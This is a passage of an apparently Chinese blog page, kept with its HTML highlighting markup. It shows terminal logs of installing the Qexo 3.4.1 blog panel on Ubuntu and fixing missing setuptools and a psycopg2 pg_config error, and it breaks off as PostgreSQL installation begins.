(3.13.3-11ubuntu1.1) ...</span><br><span class="hljs-string">Processing triggers for mime-support (3.60ubuntu1) ...</span><br><span class="hljs-string">Processing triggers for desktop-file-utils (0.23-1ubuntu3.18.04.2) ...</span><br><span class="hljs-string">Processing triggers for man-db (2.8.3-2ubuntu0.1) ...</span><br><span class="hljs-string">[root@ningan ~]# </span><br><span class="hljs-string">[root@ningan ~]# </span><br><span class="hljs-string">[root@ningan ~]# python3.8 --version</span><br><span class="hljs-string">Python 3.8.0</span><br></code></pre></td></tr></table></figure><h3 id="å›åˆ°ä¸»çº¿"><a href="#å›åˆ°ä¸»çº¿" class="headerlink" title="å›åˆ°ä¸»çº¿"></a>å›åˆ°ä¸»çº¿</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan Qexo-3.4.1]<span class="hljs-comment"># python3.8 -m pip install -r requirements.txt</span><br>Collecting Django==3.2.25 (from -r requirements.txt (line 1))<br>  Cache entry deserialization failed, entry ignored<br>  Cache entry deserialization failed, entry ignored<br>  Downloading https://files.pythonhosted.org/packages/30/8e/cc23c762c5dcd1d367d73cf006a326e0df2bd0e785cba18b658b39904c1e/Django-3.2.25-py3-none-any.whl (7.9MB)<br>    100% |â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 7.9MB 189kB/s <br>Collecting PyMySQL==1.0.2 (from -r requirements.txt (line 2))<br>  Cache entry deserialization failed, entry ignored<br>  Cache entry deserialization failed, entry ignored<br>  Downloading https://files.pythonhosted.org/packages/4f/52/a115fe175028b058df353c5a3d5290b71514a83f67078a6482cff24d6137/PyMySQL-1.0.2-py3-none-any.whl (43kB)<br>    100% |â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 51kB 3.1MB/s <br>Collecting boto3==1.34.44 (from -r requirements.txt (line 3))<br>  Cache entry deserialization failed, entry ignored<br>  Downloading https://files.pythonhosted.org/packages/15/1e/cbec55e05c0577429945d785cce8e16eebf2a8bd9c5ccda2b9c6e2a51ab4/boto3-1.34.44-py3-none-any.whl (139kB)<br>    100% |â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 143kB 2.5MB/s <br>Collecting requests==2.31.0 (from -r requirements.txt (line 4))<br>  Cache entry deserialization failed, entry ignored<br>  Cache entry deserialization failed, entry ignored<br>  Downloading https://files.pythonhosted.org/packages/70/8e/0e2d847013cb52cd35b38c009bb167a1a26b2ce6cd6965bf26b47bc0bf44/requests-2.31.0-py3-none-any.whl (62kB)<br>    100% |â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 71kB 2.8MB/s <br>Collecting PyGithub==2.2.0 (from -r requirements.txt (line 5))<br>  Cache entry deserialization failed, entry ignored<br>  Downloading https://files.pythonhosted.org/packages/37/56/6e038f8cd6b76984005cd5cf90926caa6898b4220984a32dbbdc044a3f18/PyGithub-2.2.0-py3-none-any.whl (350kB)<br>    100% |â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 358kB 2.0MB/s <br>Collecting python-gitlab==4.4.0 (from -r requirements.txt (line 6))<br>  Downloading https://files.pythonhosted.org/packages/70/f3/82ec52f96bbcccd10a6ce8f145115d08463c54a374f31beb278aa16d8b25/python_gitlab-4.4.0-py3-none-any.whl (138kB)<br>    100% |â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 143kB 2.4MB/s <br>Collecting html2text==2020.1.16 (from -r requirements.txt (line 7))<br>  Downloading https://files.pythonhosted.org/packages/ae/88/14655f727f66b3e3199f4467bafcc88283e6c31b562686bf606264e09181/html2text-2020.1.16-py3-none-any.whl<br>Collecting PyYAML==6.0.1 (from -r requirements.txt (line 8))<br>  Downloading https://files.pythonhosted.org/packages/cd/e5/af35f7ea75cf72f2cd079c95ee16797de7cd71f29ea7c68ae5ce7be1eda0/PyYAML-6.0.1.tar.gz (125kB)<br>    100% |â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 133kB 2.5MB/s <br>    Complete output from <span class="hljs-built_in">command</span> python setup.py egg_info:<br>    Traceback (most recent call last):<br>      File <span class="hljs-string">&quot;&lt;string&gt;&quot;</span>, line 1, <span class="hljs-keyword">in</span> &lt;module&gt;<br>    ModuleNotFoundError: No module named <span class="hljs-string">&#x27;setuptools&#x27;</span><br>    <br>    ----------------------------------------<br>Command <span class="hljs-string">&quot;python setup.py egg_info&quot;</span> failed with error code 1 <span class="hljs-keyword">in</span> /tmp/pip-build-7rwpufp2/PyYAML/<br></code></pre></td></tr></table></figure><h3 id="å°æ’æ›²ï¼šæ£€æŸ¥setuptoolsè£…åœ¨å“ªé‡Œäº†"><a href="#å°æ’æ›²ï¼šæ£€æŸ¥setuptoolsè£…åœ¨å“ªé‡Œäº†" class="headerlink" title="å°æ’æ›²ï¼šæ£€æŸ¥setuptoolsè£…åœ¨å“ªé‡Œäº†"></a>å°æ’æ›²ï¼šæ£€æŸ¥setuptoolsè£…åœ¨å“ªé‡Œäº†</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan Qexo-3.4.1]<span class="hljs-comment"># python -m pip show setuptools</span><br>Name: setuptools<br>Version: 59.6.0<br>Summary: Easily download, build, install, upgrade, and uninstall Python packages<br>Home-page: https://github.com/pypa/setuptools<br>Author: Python Packaging Authority<br>Author-email: distutils-sig@python.org<br>License: UNKNOWN<br>Location: /usr/local/lib/python3.6/dist-packages<br>Requires: <br>Required-by: launchpadlib, tensorboard<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># python3 -m pip show setuptools</span><br>Name: setuptools<br>Version: 59.6.0<br>Summary: Easily download, build, install, upgrade, and uninstall Python packages<br>Home-page: https://github.com/pypa/setuptools<br>Author: Python Packaging Authority<br>Author-email: distutils-sig@python.org<br>License: UNKNOWN<br>Location: /usr/local/lib/python3.6/dist-packages<br>Requires: <br>Required-by: launchpadlib, tensorboard<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># python3.8 -m pip show setuptools</span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># </span><br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># python3.8 -m pip install setuptools</span><br>Collecting setuptools<br>  Cache entry deserialization failed, entry ignored<br>  Downloading https://files.pythonhosted.org/packages/90/12/282ee9bce8b58130cb762fbc9beabd531549952cac11fc56add11dcb7ea0/setuptools-75.3.0-py3-none-any.whl (1.3MB)<br>    100% |â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| 1.3MB 898kB/s <br>Installing collected packages: setuptools<br>Successfully installed setuptools-75.3.0<br>[root@ningan Qexo-3.4.1]<span class="hljs-comment"># python3.8 -m pip show setuptools</span><br>Name: setuptools<br>Version: 75.3.0<br>Summary: Easily download, build, install, upgrade, and uninstall Python packages<br>Home-page: None<br>Author: None<br>Author-email: Python Packaging Authority &lt;distutils-sig@python.org&gt;<br>License: None<br>Location: /usr/local/lib/python3.8/dist-packages<br>Requires: <br></code></pre></td></tr></table></figure><h3 id="å›åˆ°ä¸»çº¿-1"><a href="#å›åˆ°ä¸»çº¿-1" class="headerlink" title="å›åˆ°ä¸»çº¿"></a>å›åˆ°ä¸»çº¿</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs awk">[root@ningan Qexo-<span class="hljs-number">3.4</span>.<span class="hljs-number">1</span>]<span class="hljs-comment"># python3.8 -m pip install -r requirements.txt</span><br>Collecting Django==<span class="hljs-number">3.2</span>.<span class="hljs-number">25</span> (from -r requirements.txt (line <span class="hljs-number">1</span>))<br>  Using cached https:<span class="hljs-regexp">//</span>files.pythonhosted.org<span class="hljs-regexp">/packages/</span><span class="hljs-number">30</span><span class="hljs-regexp">/8e/</span>cc23c762c5dcd1d367d73cf006a326e0df2bd0e785cba18b658b39904c1e/Django-<span class="hljs-number">3.2</span>.<span class="hljs-number">25</span>-py3-none-any.whl<br>Collecting PyMySQL==<span class="hljs-number">1.0</span>.<span class="hljs-number">2</span> (from -r requirements.txt (line <span class="hljs-number">2</span>))<br>  Using cached https:<span class="hljs-regexp">//</span>files.pythonhosted.org<span class="hljs-regexp">/packages/</span><span class="hljs-number">4</span>f<span class="hljs-regexp">/52/</span>a115fe175028b058df353c5a3d5290b71514a83f67078a6482cff24d6137/PyMySQL-<span class="hljs-number">1.0</span>.<span class="hljs-number">2</span>-py3-none-any.whl<br>Collecting boto3==<span class="hljs-number">1.34</span>.<span class="hljs-number">44</span> (from -r requirements.txt (line <span class="hljs-number">3</span>))<br>  Using cached https:<span class="hljs-regexp">//</span>files.pythonhosted.org<span class="hljs-regexp">/packages/</span><span class="hljs-number">15</span><span class="hljs-regexp">/1e/</span>cbec55e05c0577429945d785cce8e16eebf2a8bd9c5ccda2b9c6e2a51ab4/boto3-<span class="hljs-number">1.34</span>.<span class="hljs-number">44</span>-py3-none-any.whl<br>Collecting requests==<span class="hljs-number">2.31</span>.<span class="hljs-number">0</span> (from -r requirements.txt (line <span class="hljs-number">4</span>))<br>  Using cached https:<span class="hljs-regexp">//</span>files.pythonhosted.org<span class="hljs-regexp">/packages/</span><span class="hljs-number">70</span><span class="hljs-regexp">/8e/</span><span class="hljs-number">0</span>e2d847013cb52cd35b38c009bb167a1a26b2ce6cd6965bf26b47bc0bf44/requests-<span class="hljs-number">2.31</span>.<span class="hljs-number">0</span>-py3-none-any.whl<br>Collecting PyGithub==<span class="hljs-number">2.2</span>.<span class="hljs-number">0</span> (from -r requirements.txt (line <span class="hljs-number">5</span>))<br>  Using cached https:<span class="hljs-regexp">//</span>files.pythonhosted.org<span class="hljs-regexp">/packages/</span><span class="hljs-number">37</span><span class="hljs-regexp">/56/</span><span class="hljs-number">6</span>e038f8cd6b76984005cd5cf90926caa6898b4220984a32dbbdc044a3f18/PyGithub-<span class="hljs-number">2.2</span>.<span class="hljs-number">0</span>-py3-none-any.whl<br>Collecting python-gitlab==<span class="hljs-number">4.4</span>.<span class="hljs-number">0</span> (from -r requirements.txt (line <span class="hljs-number">6</span>))<br>  Using cached https:<span class="hljs-regexp">//</span>files.pythonhosted.org<span class="hljs-regexp">/packages/</span><span class="hljs-number">70</span><span class="hljs-regexp">/f3/</span><span class="hljs-number">82</span>ec52f96bbcccd10a6ce8f145115d08463c54a374f31beb278aa16d8b25/python_gitlab-<span class="hljs-number">4.4</span>.<span class="hljs-number">0</span>-py3-none-any.whl<br>Collecting html2text==<span class="hljs-number">2020.1</span>.<span class="hljs-number">16</span> (from -r requirements.txt (line <span class="hljs-number">7</span>))<br>  Using cached https:<span class="hljs-regexp">//</span>files.pythonhosted.org<span class="hljs-regexp">/packages/</span>ae<span class="hljs-regexp">/88/</span><span class="hljs-number">14655</span>f727f66b3e3199f4467bafcc88283e6c31b562686bf606264e09181/html2text-<span class="hljs-number">2020.1</span>.<span class="hljs-number">16</span>-py3-none-any.whl<br>Collecting PyYAML==<span class="hljs-number">6.0</span>.<span class="hljs-number">1</span> (from -r requirements.txt (line <span class="hljs-number">8</span>))<br>  Using cached https:<span class="hljs-regexp">//</span>files.pythonhosted.org<span class="hljs-regexp">/packages/</span>cd<span class="hljs-regexp">/e5/</span>af35f7ea75cf72f2cd079c95ee16797de7cd71f29ea7c68ae5ce7be1eda0/PyYAML-<span class="hljs-number">6.0</span>.<span class="hljs-number">1</span>.tar.gz<br>Collecting urllib3==<span class="hljs-number">1.26</span>.<span class="hljs-number">18</span> (from -r requirements.txt (line <span class="hljs-number">9</span>))<br>  Cache entry deserialization failed, entry ignored<br>  Downloading https:<span class="hljs-regexp">//</span>files.pythonhosted.org<span class="hljs-regexp">/packages/</span>b0<span class="hljs-regexp">/53/</span>aa91e163dcfd1e5b82d8a890ecf13314e3e149c05270cc644581f77f17fd/urllib3-<span class="hljs-number">1.26</span>.<span class="hljs-number">18</span>-py2.py3-none-any.whl (<span class="hljs-number">143</span>kB)<br>    <span class="hljs-number">100</span>% |â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| <span class="hljs-number">153</span>kB <span class="hljs-number">1.1</span>MB/s <br>Collecting Markdown==<span class="hljs-number">3.5</span>.<span class="hljs-number">2</span> (from -r requirements.txt (line <span class="hljs-number">10</span>))<br>  Cache entry deserialization failed, entry ignored<br>  Downloading https:<span class="hljs-regexp">//</span>files.pythonhosted.org<span class="hljs-regexp">/packages/</span><span class="hljs-number">42</span><span class="hljs-regexp">/f4/</span>f0031854de10a0bc7821ef9fca0b92ca0d7aa6fbfbf504c5473ba825e49c/Markdown-<span class="hljs-number">3.5</span>.<span class="hljs-number">2</span>-py3-none-any.whl (<span class="hljs-number">103</span>kB)<br>    <span class="hljs-number">100</span>% |â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| <span class="hljs-number">112</span>kB <span class="hljs-number">3.9</span>MB/s <br>Collecting djongo5==<span class="hljs-number">1.3</span>.<span class="hljs-number">9</span> (from -r requirements.txt (line <span class="hljs-number">11</span>))<br>  Downloading https:<span class="hljs-regexp">//</span>files.pythonhosted.org<span class="hljs-regexp">/packages/</span><span class="hljs-number">1</span>d<span class="hljs-regexp">/42/</span>f3aaa938638cdf5c17a766950029bdb0a370580255a58cf2fb27fe487c66/djongo5-<span class="hljs-number">1.3</span>.<span class="hljs-number">9</span>-py3-none-any.whl (<span class="hljs-number">51</span>kB)<br>    <span class="hljs-number">100</span>% |â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| <span class="hljs-number">51</span>kB <span class="hljs-number">4.0</span>MB/s <br>Collecting django-cors-headers==<span class="hljs-number">4.1</span>.<span class="hljs-number">0</span> (from -r requirements.txt (line <span class="hljs-number">12</span>))<br>  Downloading https:<span class="hljs-regexp">//</span>files.pythonhosted.org<span class="hljs-regexp">/packages/</span>a0<span class="hljs-regexp">/2c/</span><span class="hljs-number">7</span>df4f05a02b20b2c22ffc137b5a04f93214bbaf202fd2a29637ac694e0e4/django_cors_headers-<span class="hljs-number">4.1</span>.<span class="hljs-number">0</span>-py3-none-any.whl<br>Collecting pymongo==<span class="hljs-number">3.13</span>.<span class="hljs-number">0</span> (from -r requirements.txt (line <span class="hljs-number">13</span>))<br>  Downloading https:<span class="hljs-regexp">//</span>files.pythonhosted.org<span class="hljs-regexp">/packages/</span><span class="hljs-number">0</span>b<span class="hljs-regexp">/9c/</span>e1652def3cc841688402fcfa676eb14bd5551cb29c7e1b6f65488d89b30b/pymongo-<span class="hljs-number">3.13</span>.<span class="hljs-number">0</span>-cp38-cp38-manylinux1_x86_64.whl (<span class="hljs-number">524</span>kB)<br>    <span class="hljs-number">100</span>% |â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| <span class="hljs-number">532</span>kB <span class="hljs-number">1.3</span>MB/s <br>Collecting dnspython==<span class="hljs-number">2.2</span>.<span class="hljs-number">1</span> (from -r requirements.txt (line <span class="hljs-number">14</span>))<br>  Downloading https:<span class="hljs-regexp">//</span>files.pythonhosted.org<span class="hljs-regexp">/packages/</span><span class="hljs-number">9</span>b<span class="hljs-regexp">/ed/</span><span class="hljs-number">28</span>fb14146c7033ba0e89decd92a4fa16b0b69b84471e2deab3cc4337cc35/dnspython-<span class="hljs-number">2.2</span>.<span class="hljs-number">1</span>-py3-none-any.whl (<span class="hljs-number">269</span>kB)<br>    <span class="hljs-number">100</span>% |â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| <span class="hljs-number">276</span>kB <span class="hljs-number">5.1</span>MB/s <br>Collecting sqlparse==<span class="hljs-number">0.2</span>.<span class="hljs-number">4</span> (from -r requirements.txt (line <span class="hljs-number">15</span>))<br>  Downloading https:<span class="hljs-regexp">//</span>files.pythonhosted.org<span class="hljs-regexp">/packages/</span><span class="hljs-number">65</span><span class="hljs-regexp">/85/</span><span class="hljs-number">20</span>bdd72f4537cf2c4d5d005368d502b2f464ede22982e724a82c86268eda/sqlparse-<span class="hljs-number">0.2</span>.<span class="hljs-number">4</span>-py2.py3-none-any.whl<br>Collecting psycopg2-binary==<span class="hljs-number">2.9</span>.<span class="hljs-number">9</span> (from -r requirements.txt (line <span class="hljs-number">16</span>))<br>  Downloading https:<span class="hljs-regexp">//</span>files.pythonhosted.org<span class="hljs-regexp">/packages/</span>fc<span class="hljs-regexp">/07/</span>e720e53bfab016ebcc34241695ccc06a9e3d91ba19b40ca81317afbdc440/psycopg2-binary-<span class="hljs-number">2.9</span>.<span class="hljs-number">9</span>.tar.gz (<span class="hljs-number">384</span>kB)<br>    <span class="hljs-number">100</span>% |â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ| <span class="hljs-number">389</span>kB <span class="hljs-number">3.1</span>MB/s <br>    Complete output from command python setup.py egg_info:<br>    running egg_info<br>    creating pip-egg-info/psycopg2_binary.egg-info<br>    writing pip-egg-info<span class="hljs-regexp">/psycopg2_binary.egg-info/</span>PKG-INFO<br>    writing dependency_links to pip-egg-info<span class="hljs-regexp">/psycopg2_binary.egg-info/</span>dependency_links.txt<br>    writing top-level names to pip-egg-info<span class="hljs-regexp">/psycopg2_binary.egg-info/</span>top_level.txt<br>    writing manifest file <span class="hljs-string">&#x27;pip-egg-info/psycopg2_binary.egg-info/SOURCES.txt&#x27;</span><br>    <br>    Error: pg_config executable not found.<br>    <br>    pg_config is required to build psycopg2 from source.  Please add the directory<br>    containing pg_config to the <span class="hljs-variable">$PATH</span> or specify the full executable path with the<br>    option:<br>    <br>        python setup.py build_ext --pg-config <span class="hljs-regexp">/path/</span>to/pg_config build ...<br>    <br>    or with the pg_config option <span class="hljs-keyword">in</span> <span class="hljs-string">&#x27;setup.cfg&#x27;</span>.<br>    <br>    If you prefer to avoid building psycopg2 from source, please install the PyPI<br>    <span class="hljs-string">&#x27;psycopg2-binary&#x27;</span> package instead.<br>    <br>    For further information please check the <span class="hljs-string">&#x27;doc/src/install.rst&#x27;</span> file (also at<br>    &lt;https:<span class="hljs-regexp">//</span>www.psycopg.org<span class="hljs-regexp">/docs/i</span>nstall.html&gt;).<br>    <br>    <br>    ----------------------------------------<br>Command <span class="hljs-string">&quot;python setup.py egg_info&quot;</span> failed with error code <span class="hljs-number">1</span> <span class="hljs-keyword">in</span> <span class="hljs-regexp">/tmp/</span>pip-build-<span class="hljs-number">65</span>ez5n40<span class="hljs-regexp">/psycopg2-binary/</span><br>[root@ningan Qexo-<span class="hljs-number">3.4</span>.<span class="hljs-number">1</span>]<span class="hljs-comment"># </span><br></code></pre></td></tr></table></figure><h3 id="å°æ’æ›²ï¼šå®‰è£…postgresql"><a href="#å°æ’æ›²ï¼šå®‰è£…postgresql" class="headerlink" title="å°æ’æ›²ï¼šå®‰è£…postgresql"></a>å°æ’æ›²ï¼šå®‰è£…postgresql</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><code class="hljs bash">[root@ningan Qexo-3.4.1]<span class="hljs-comment"># psql --version</span><br><br>Command <span 